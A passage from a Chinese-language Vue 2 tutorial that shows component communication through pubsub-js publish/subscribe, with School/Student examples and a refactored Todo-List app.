    <span>{{ todoObj.title }}</span>
  </label>
  <button class="btn btn-danger" @click="handleDelete(todoObj.id)">删除</button>
  </li>
</template>

<script>
  export default {
    name: "MyItem",
    data() {
      return {};
    },
    props: ["todoObj"], // 声明接受todoObj对象
    methods: {
      handleCheck(id) {
        this.$bus.$emit('checkTodo', id)
      },
      handleDelete(id) {
        if (confirm('确定删除吗？')) {
          this.$bus.$emit('deleteTodo', id)
        }
      }
    },
  };
</script>
~~~

## 消息的发布与订阅

消息发布与订阅(pubsub)   消息订阅与发布是一种组件间通信的方式，适用于任意组件间通信

### 使用步骤

1. 安装pubsub `npm i pubsub-js`

2. 引入`import pubsub from 'pubsub-js'`

3. 接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的回调留在A组件自身

   ~~~js
   export default{
     methods：{
     	demo(msgName,data){...}
   	},
     mounted(){
       this.pid=pubsub.subscribe('xxx',this.demo)
     }
   }
   ~~~

   

4. 提供数据`pubsub.publish('xxx',data)`

5. 最好在beforeDestroy钩子中，使用`pubsub.unsubscribe(pid)`取消订阅

`src/components/School.vue`

~~~vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	import pubsub from 'pubsub-js'

	export default {
		name: 'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
		methods: {
			demo(msgName, data) {
				console.log('我是School组件，收到了数据：',msgName, data)
			}
		},
		mounted() {
			this.pubId = pubsub.subscribe('demo', this.demo) // 订阅消息
		},
		beforeDestroy() {
			pubsub.unsubscribe(this.pubId) // 取消订阅
		}
	}
</script>

<style scoped>
	.school{
		background-color: skyblue;
		padding: 5px;
	}
</style>
~~~

`src/components/Student.vue`

~~~vue
<template>
  <div class="student">
    <h2>学生姓名：{{name}}</h2>
    <h2>学生性别：{{sex}}</h2>
    <button @click="sendStudentName">把学生名给School组件</button>
  </div>
</template>

<script>
  import pubsub from 'pubsub-js'

  export default {
    name:'Student',
    data() {
      return {
        name:'JOJO',
        sex:'男',
      }
    },
    methods: {
      sendStudentName(){
        pubsub.publish('demo', this.name) // 发布消息
      }
    }
  }
</script>

<style scoped>
  .student{
    background-color: pink;
    padding: 5px;
    margin-top: 30px;
  }
</style>
~~~

### 使用消息的订阅与发布优化Todo-List

`src/App.vue`

~~~vue
<template>
<div id="root">
  <div class="todo-container">
    <div class="todo-wrap">
      <MyHeader @addTodo="addTodo"/>
      <MyList :todos="todos"/>
      <MyFooter :todos="todos" @checkAllTodo="checkAllTodo" @clearAllTodo="clearAllTodo"/>
  	</div>
  </div>
</div>
</template>

<script>
  import pubsub from 'pubsub-js'	// 习惯第三方库写上面
  import MyHeader from './components/MyHeader.vue'
  import MyList from './components/MyList.vue'
  import MyFooter from './components/MyFooter.vue'


  export default {
    name:'App',
    components: { MyHeader,MyList,MyFooter },
    data() {
      return {
        todos:JSON.parse(localStorage.getItem('todos')) || []
      }
    },
    methods:{
      //添加一个todo
      addTodo(todoObj){
        this.todos.unshift(todoObj)
      },
      //勾选or取消勾选一个todo
      checkTodo(_,id){
        this.todos.forEach((todo)=>{
          if(todo.id === id) todo.done = !todo.done
        })
      },
      //删除一个todo
      deleteTodo(id){
        this.todos = this.todos.filter(todo => todo.id !== id)
      },
      //全选or取消勾选
      checkAllTodo(done){
        this.todos.forEach(todo => todo.done = done)
      },
      //删除已完成的todo
      clearAllTodo(){
        this.todos = this.todos.filter(todo => !todo.done)
      }
    },
    watch:{
      todos:{
        deep:true,
        handler(value){
          localStorage.setItem('todos',JSON.stringify(value))
        }
      }
    },
    mounted(){
      this.pubId = pubsub.subscribe('checkTodo',this.checkTodo)	// 两种对比
      this.$bus.$on('deleteTodo',this.deleteTodo)
    },
    beforeDestroy(){
      pubsub.unsubscribe(this.pubId)
      this.$bus.$off('deleteTodo')
    }
  }
</script>

<style>
  body {
    background: #fff;
  }

  .btn {
    display: inline-block;
    padding: 4px 12px;
    margin-bottom: 0;
    font-size: 14px;
    line-height: 20px;
    text-align: center;
    vertical-align: middle;
    cursor: pointer;
    box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
    border-radius: 4px;
  }

  .btn-danger {
    color: #fff;
    background-color: #da4f49;
    border: 1px solid #bd362f;
  }

  .btn-danger:hover {
    color: #fff;
    background-color: #bd362f;
  }

  .btn:focus {
    outline: none;
  }

  .todo-container {
    width: 600px;
    margin: 0 auto;
  }
  .todo-container .todo-wrap {
    padding: 10px;
    border: 1px solid #ddd;
    border-radius: 5px;
  }
</style>
~~~

`src/components/myItem.vue`

~~~vue
<template>
    <li>
        <label>
            <input type="checkbox" :checked="todo.done" @click="handleCheck(todo.id)"/>
            <span>{{todo.title}}</span>
        </label>
        <button class="btn btn-danger" @click="handleDelete(todo.id,todo.title)">删除</button>
    </li>
</template>

<script>
    import pubsub from 'pubsub-js'
    export default {
        name:'MyItem',
        props:['todo'],
        methods:{
            handleCheck(id){                    
                pubsub.publish('checkTodo',id)
            },
            handleDelete(id,title){
                if(confirm("确定删除任务："+title+"吗？")){
                    this.$bus.$emit('deleteTodo',id)
                }
            }
        }
    }
</script>

<style scoped>
    li {
        list-style: none;
        height: 36px;
        line-height: 36px;
        padding: 0 5px;
        border-bottom: 1px solid #ddd;
    }

    li label {
        float: left;
        cursor: pointer;
    }

    li label li input {
        vertical-align: middle;
        margin-right: 6px;
        position: relative;
        top: -1px;
    }

    li button {
        float: right;
        display: none;
        margin-top: 3px;
    }

    li:before {
        content: initial;
    }

    li:last-child {
        border-bottom: none;
    }

    li:hover {
        background-color: #eee;
    }

    li:hover button{
        display: block;
    }
</style>
~~~

